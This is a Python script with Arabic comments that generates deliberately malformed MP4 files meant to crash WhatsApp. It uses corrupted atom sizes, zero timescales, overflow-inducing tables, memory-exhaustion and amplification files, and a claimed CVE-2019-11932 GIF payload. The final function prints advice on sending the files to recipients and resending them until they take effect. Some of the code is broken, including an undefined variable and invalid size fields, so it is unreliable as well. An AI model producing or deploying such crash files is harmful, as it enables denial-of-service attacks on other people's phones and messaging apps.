import struct
import os
import random

def create_corrupted_mp4_v1(filename="whatsapp_crash.mp4"):
    """
    إنشاء فيديو MP4 مع هيكل atoms مشوه
    """
    
    with open(filename, 'wb') as f:
        # 1. FTYP atom مع حجم غير صحيح
        f.write(b'ftyp')
        f.write(struct.pack('>I', 0xFFFFFFFF))  # حجم أكبر من الملف نفسه
        f.write(b'mp42')
        f.write(b'\x00' * 100)  # بيانات إضافية
        
        # 2. MOOV atom في نهاية الملف (يجب أن يكون في البداية)
        f.write(b'mdat')
        f.write(struct.pack('>I', 1000000))
        f.write(os.urandom(1000000))  # بيانات فيديو عشوائية
        
        # 3. MOOV atom كبير جداً مع بيانات مشوهة
        f.write(b'moov')
        f.write(struct.pack('>I', 50000000))  # 50MB - حجم غير واقعي
        
        # إضافة trak atoms كثيرة
        for i in range(1000):
            f.write(b'trak')
            f.write(struct.pack('>I', 5000))
            f.write(b'mdhd' + struct.pack('>I', 0) + os.urandom(4992))
        
        # 4. إضافة atom غير معروف
        f.write(b'CRSH')  # atom مخصص للتعطل
        f.write(struct.pack('>I', 10000))
        f.write(b'\xff' * 10000)

def create_corrupted_mp4_v2(filename="crash_v2.mp4"):
    """
    فيديو مع timescale = 0 مما يسبب قسمة على صفر
    """
    
    with open(filename, 'wb') as f:
        # FTYP
        f.write(b'ftypmp42\x00\x00\x00\x00')
        
        # MOOV
        f.write(b'moov')
        moov_size = 200
        f.write(struct.pack('>I', moov_size))
        
        # MVHD مع timescale = 0
        f.write(b'mvhd')
        f.write(struct.pack('>I', 92))  # حجم mvhd
        f.write(b'\x00' * 8)  # version + flags
        f.write(struct.pack('>I', 0))  # creation time
        f.write(struct.pack('>I', 0))  # modification time
        f.write(struct.pack('>I', 0))  # timescale = 0 (خطأ متعمد)
        f.write(struct.pack('>I', 1000))  # duration
        f.write(b'\x00' * 76)  # باقي البيانات
        
        # TRAK
        f.write(b'trak')
        f.write(struct.pack('>I', 100))
        f.write(b'\xff' *118)

def create_mp4_with_circular_references(filename="circular.mp4"):
    """
    فيديو مع إشارات دائرية بين atoms
    """
    
    with open(filename, 'wb') as f:
        # FTYP
        f.write(b'ftyp')
        f.write(struct.pack('>I', 16))
        f.write(b'mp42\x00\x00\x00\x00')
        
        # MOOV الذي يشير إلى MDAT الذي يشير إلى MOOV
        f.write(b'moov')
        f.write(struct.pack('>I', 100))
        
        # MDHD مع offset سلبي
        f.write(b'mdhd')
        f.write(struct.pack('>I', 32))
        f.write(b'\x00' * 24)
        f.write(struct.pack('>I', 0xFFFFFFFF))  # duration كبير جداً
        
        # STCO مع offsets غير صالحة
        f.write(b'stco')
        f.write(struct.pack('>I', 100))
        f.write(struct.pack('>I', 50))  # عدد الإدخالات
        
        # إضافة offsets غير صالحة
        for i in range(50):
            f.write(struct.pack('>I', random.randint(0xFFFFFFF0, 0xFFFFFFFF)))
def corrupt_existing_mp4(input_file, output_file):
    """
    تعديل فيديو MP4 موجود ليكون مشوهاً
    """
    
    with open(input_file, 'rb') as f:
        data = bytearray(f.read())
    
    # البحث عن atoms وتدميرها
    atoms = ['ftyp', 'moov', 'mdat', 'trak', 'mdia', 'minf']
    
    for i in range(len(data) - 4):
        chunk = data[i:i+4]
        if chunk in [a.encode() for a in atoms]:
            # تدمير هذا atom
            if i + 8 < len(data):
                # تغيير الحجم إلى قيمة كبيرة جداً
                data[i+4:i+8] = struct.pack('>I', 0x7FFFFFFF)
                
                # إضافة بيانات عشوائية
                insert_pos = i + 8
                random_data = os.urandom(10000)
                if insert_pos + len(random_data) < len(data):
                    data[insert_pos:insert_pos+len(random_data)] = random_data
    
    # إضافة atom زائف في النهاية
    data.extend(b'crsh')
    data.extend(struct.pack('>I', 0xFFFFFFFF))
    data.extend(b'\x00' * 1000000)  # 1MB من البيانات
    
    with open(output_file, 'wb') as f:
        f.write(data)
import subprocess

def create_extreme_video_ffmpeg():
    """
    استخدام ffmpeg لإنشاء فيديو بخصائص غير واقعية
    """
    
    # 1. فيديو بمعدل إطار مرتفع جداً
    cmd1 = [
        'ffmpeg',
        '-f', 'lavfi',
        '-i', 'testsrc=size=1920x1080:rate=1000',
        '-t', '2',
        '-c:v', 'libx264',
        '-r', '1000',  # 1000 إطار في الثانية
        '-b:v', '500M',  # 500 ميجابت/ثانية
        '-pix_fmt', 'yuv444p',
        '-x264opts', 'keyint=1',
        '-metadata', 'title=' + 'A' * 5000,
        'high_fps_crash.mp4'
    ]
    
    # 2. فيديو بدقة ضخمة
    cmd2 = [
        'ffmpeg',
        '-f', 'lavfi',
        '-i', 'nullsrc=size=10000x10000',
        '-t', '1',
        '-c:v', 'libx264',
        '-s', '10000x10000',  # 10000x10000 دقة
        '-b:v', '1G',
        'huge_resolution.mp4'
    ]
    
    # 3. فيديو مع ترميز مشوه
    cmd3 = [
        'ffmpeg',
        '-f', 'lavfi',
        '-i', 'smptehdbars=size=640x480',
        '-t', '5',
        '-c:v', 'libx264',
        '-crf', '0',  # ضغط منخفض جداً
        '-preset', 'veryslow',
        '-g', '1',  # GOP size = 1
        '-sc_threshold', '0',
        '-maxrate', '100M',
        '-bufsize', '200M',
        '-movflags', '+faststart',
        '-bsf:v', 'h264_metadata=aud=insert',
        'corrupt_encoding.mp4'
    ]
    
    try:
        subprocess.run(cmd1, capture_output=True)
        subprocess.run(cmd2, capture_output=True)
        subprocess.run(cmd3, capture_output=True)
    except:
        # إذا لم يكن ffmpeg موجوداً، إنشاء ملفات يدوياً
        create_fake_videos()

def create_fake_videos():
    """إنشاء فيديوهات مشوهة يدوياً"""
    
    videos = {
        'compressed_bomb.mp4': create_compressed_bomb(),
        'fragmented_crash.mp4': create_fragmented_mp4(),
        'zero_length_chunks.mp4': create_zero_length_chunks()
    }
    
    for filename, data in videos.items():
        with open(filename, 'wb') as f:
            f.write(data)

def create_compressed_bomb():
    """إنشاء فيديو مع بيانات مضغوطة بشكل متكرر"""
    
    data = bytearray()
    
    # هيكل MP4 مع ZLIB bomb في التعليقات
    data.extend(b'ftypmp42\x00\x00\x00\x00')
    data.extend(b'moov\x00\x00\x00\x08')
    
    # إضافة udta مع بيانات كبيرة
    data.extend(b'udta')
    data.extend(struct.pack('>I', 50000))
    
    # بيانات مضغوطة متكررة
    for i in range(100):
        data.extend(b'\x78\x9c')  # ZLIB header
        data.extend(b'\x00' * 1000)
    
    return data

def create_fragmented_mp4():
    """إنشاء فيديو fragmented MP4 مع إشارات غير صالحة"""
    
    data = bytearray()
    
    # FTYP
    data.extend(b'ftyp')
    data.extend(struct.pack('>I', 24))
    data.extend(b'mp42isom\x00\x00\x00\x00')
    
    # MOOV صغير
    data.extend(b'moov')
    data.extend(struct.pack('>I', 1000))
    data.extend(b'\x00' * 1000)
    
    # عدة mdat fragments
    for i in range(100):
        data.extend(b'mdat')
        size = random.randint(10000, 50000)
        data.extend(struct.pack('>I', size))
        data.extend(os.urandom(size))
        
        # moof بين mdat fragments
        data.extend(b'moof')
        data.extend(struct.pack('>I', 50))
        data.extend(b'traf')
        data.extend(struct.pack('>I', 30))
        data.extend(b'tfhd\x00\x00\x00\x00\xFF\xFF\xFF\xFF')
    
    return data
def target_whatsapp_specific():
    """استهداف ثغرات معروفة في واتساب"""
    
    # 1. CVE-2019-11932: GIF processing RCE
    gif_exploit = b'GIF89a\x90\x00\x90\x00\xf7\x00\x00'
    gif_exploit += b'\x21\xff\x0b'  # Application Extension
    gif_exploit += b'NETSCAPE2.0'
    gif_exploit += b'\x03\x01' + b'\xff\xff' + b'\x00'
    gif_exploit += b'\x2c\x00\x00\x00\x00\x90\x00\x90\x00\x00'
    gif_exploit += b'\x02\x1c' + b'\x7f' * 1000
    
    with open('gif_in_mp4.mp4', 'wb') as f:
        # تغليف GIF داخل MP4
        f.write(b'ftypmp42\x00\x00\x00\x00')
        f.write(b'moov\x00\x00\x00\x08')
        f.write(b'mdat')
        f.write(struct.pack('>I', len(gif_exploit) + Trailer))
        f.write(gif_exploit)
        f.write(b'\x00\x00\x00\x00mdat\x00\x00\x00\x00')
    
    # 2. Integer overflow في sample size table
    with open('integer_overflow.mp4', 'wb') as f:
        f.write(b'ftypmp42\x00\x00\x00\x00')
        f.write(b'moov\x00\x00\x00\x54')
        f.write(b'trak\x00\x00\x00\x4c')
        f.write(b'mdia\x00\x00\x00\x44')
        f.write(b'minf\x00\x00\x00\x3c')
        f.write(b'stbl\x00\x00\x00\x34')
        
        # STSZ atom مع count كبير جداً
        f.write(b'stsz')
        f.write(struct.pack('>I', 20))
        f.write(b'\x00\x00\x00\x00')  # sample size = 0
        f.write(struct.pack('>I', 0x7FFFFFFF))  # عدد كبير جداً
        
        # sample sizes
        for i in range(100):
            f.write(struct.pack('>I', random.randint(0xFFFFFFFF, 0xFFFFFFFF)))
    
    # 3. Heap overflow في metadata parsing
    with open('heap_overflow.mp4', 'wb') as f:
        f.write(b'ftypmp42\x00\x00\x00\x00')
        
        # udta atom كبير مع بيانات مشوهة
        f.write(b'udta')
        f.write(struct.pack('>I', 0x0000FFFF))
        
        # ©too tag (too many characters)
        f.write(b'\xa9too')
        f.write(struct.pack('>I', 0x0000FFF0))
        f.write(b'A' * 0x0000FFF0)
def create_amplification_attack():
    """إنشاء فيديو يسبب استهلاك موارد مكثف"""
    
    # 1. فيديو مع إطارات I فقط (كل إطار مستقل)
    with open('i_frame_bomb.mp4', 'wb') as f:
        f.write(b'ftypisom\x00\x00\x00\x00')
        f.write(b'moov\x00\x00\x00\x78')
        
        # Trak مع 10000 sample
        f.write(b'trak\x00\x00\x00\x70')
        f.write(b'mdia\x00\x00\x00\x68')
        f.write(b'minf\x00\x00\x00\x60')
        f.write(b'stbl\x00\x00\x00\x58')
        
        # STTS: كل إطار له مدة مختلفة
        f.write(b'stts')
        f.write(struct.pack('>I', 20008))
        f.write(struct.pack('>I', (10000)))
        
        for i in range(10000):
            f.write(struct.pack('>I', 1))  # count
            f.write(struct.pack('>I', random.randint(1, 1000)))  # delta
        
        # STSC: كل sample في chunk منفصل
        f.write(b'stsc')
        f.write(struct.pack('>I', 4 + (10000 * 12)))
        f.write(struct.pack('>I', 10000))
        
        for i in range(10000):
            f.write(struct.pack('>I', i+1))  # first chunk
            f.write(struct.pack('>I', 1))    # samples per chunk
            f.write(struct.pack('>I', 1))    # sample description
        
        # MDAT كبير
        f.write(b'mdat')
        f.write(struct.pack('>I', 50000000))
        f.write(b'\x00' * 50000000)
    
    # 2. فيديو مع إشارات cross-reference معقدة
    with open('cross_ref_crash.mp4', 'wb') as f:
        f.write(b'ftypmp42\x00\x00\x00\x00')
        
        # إنشاء atoms مع إشارات متداخلة
        for i in range(100):
            f.write(b'ref' + struct.pack('B', i))
            f.write(struct.pack('>I', 16))
            f.write(struct.pack('>I', random.randint(0, 100)))  # reference إلى atom آخر
        
        # إضافة حلقة لا نهائية من الإشارات
        f.write(b'loop')
        f.write(struct.pack('>I', 12))
        f.write(struct.pack('>I', 0))  # تشير إلى نفسها

def create_memory_exhaustion_video():
    """فيديو يسبب استنفاد الذاكرة"""
    
    with open('memory_killer.mp4', 'wb') as f:
        # استخدام SDP (Sample Description) كبير
        f.write(b'ftypmp42\x00\x00\x00\x00')
        f.write(b'moov\x00\x00\x01\x00')
        
        # STSD مع بيانات وصفية كبيرة
        f.write(b'stsd')
        f.write(struct.pack('>I', 0x00010000))  # 64KB
        
        # إضافة بيانات codec مشوهة
        f.write(b'avc1\x00\x00\x00\x00\x00\x00\x00\x01')
        f.write(b'\x00' * 1000)  # reserved
        
        # Configuration record كبير
        f.write(b'\x00\x00\x00\x2A')  # length
        f.write(b'avcC')  # configuration
        f.write(b'\x01' + b'\xFF' * 10000)  # بيانات AVC
        
        # إضافة SPS/PPS كبير
        f.write(b'\x00\x00\x00\x0F')  # SPS length
        f.write(b'\xFF' * 0x0000FFFF)  # SPS data
        
        f.write(b'\x00\x00\x00\x0F')  # PPS length
        f.write(b'\xFF' * 0x0000FFFF)  # PPS data
def test_all_exploits():
    """إنشاء وتجميع كل أنواع الفيديوهات المشوهة"""
    
    print("[+] إنشاء فيديوهات مشوهة لتسبب تعطل واتساب...")
    
    # قائمة بجميع الدوال الإنشائية
    exploits = [
        ("v1_crash.mp4", lambda: create_corrupted_mp4_v1("v1_crash.mp4")),
        ("timescale_zero.mp4", lambda: create_corrupted_mp4_v2("timescale_zero.mp4")),
        ("circular_refs.mp4", lambda: create_mp4_with_circular_references("circular_refs.mp4")),
        ("extreme_fps.mp4", lambda: create_extreme_video_ffmpeg()),
        ("heap_overflow.mp4", lambda: target_whatsapp_specific()),
        ("memory_exhaustion.mp4", lambda: create_memory_exhaustion_video()),
        ("amplification.mp4", lambda: create_amplification_attack()),
        ("fragmented_crash.mp4", lambda: create_fragmented_mp4())
    ]
    
    for filename, create_func in exploits:
        try:
            create_func()
            print(f"  ✓ تم إنشاء {filename}")
            
            # التحقق من حجم الملف
            if os.path.exists(filename):
                size = os.path.getsize(filename)
                print(f"    الحجم: {size:,} بايت")
        except Exception as e:
            print(f"  ✗ فشل إنشاء {filename}: {e}")
    
    print("\n[+] نصائح للإرسال:")
    print("1. أرسل الفيديو كملف مرفق (ليس كفيديو مباشر)")
    print("2. استخدم رسالة نصية قصيرة مع الفيديو")
    print("3. كرر الإرسال إذا لم يحدث التأثير المطلوب")
    print("4. اختبر على إصدارات مختلفة من واتساب")
    
    return exploits

# تشغيل الاختبار
if __name__ == "__main__":
    test_all_exploits()
